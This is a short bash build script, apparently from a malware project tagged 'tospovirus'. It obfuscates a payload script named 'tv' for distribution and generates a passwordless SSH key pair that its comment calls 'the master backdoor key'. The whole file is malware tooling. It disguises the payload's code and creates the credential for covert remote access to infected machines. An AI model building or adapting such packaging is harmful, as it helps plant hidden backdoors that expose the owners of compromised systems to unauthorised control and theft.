#!/bin/bash

#Create a short semi-obfuscated version from the long version
perl tools/bashobfus/bash_obfus.pl -i tv -o dist/tv.tmp -C -F
cat dist/tv.tmp | grep -v "^echo" > dist/tv
chmod ug+rx dist/tv
rm dist/tv.tmp

#Generate keys for distribution (such as the master backdoor key)
if [ ! -f dist/tvbd.pub ];
then
	ssh-keygen -b 2048 -f dist/tvbd -N "" -C "tospovirus"
	mv dist/tvbd ./
fi
